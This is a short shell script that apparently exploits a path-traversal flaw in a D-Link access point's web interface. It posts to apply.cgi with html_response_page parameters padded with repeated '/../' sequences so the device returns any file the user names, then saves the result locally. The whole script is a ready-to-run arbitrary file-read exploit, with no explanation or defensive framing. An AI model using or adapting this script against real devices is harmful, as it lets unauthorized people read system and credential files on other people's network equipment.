#!/bin/sh

if [ -z "$1" ] || [ -z "$2" ]; then
	echo "Syntax error. Correct syntax: $0 FILEPATH OUTPATH [HOST]"
	exit 1;
fi

if [ "$1" = "help" ]; then
	echo "Help!"
	exit;
fi

if [ -z "$3" ]; then
	host="dlinkap"
else
	host="$3";
fi

curl --data "html_response_page=/../../../../../../../../../../../../../../../../..$1&html_response_return_page=/../../../../../../../../../../../../../../../../..$1&action=reset_ifconfig_packet_counter" $host/apply.cgi --output $2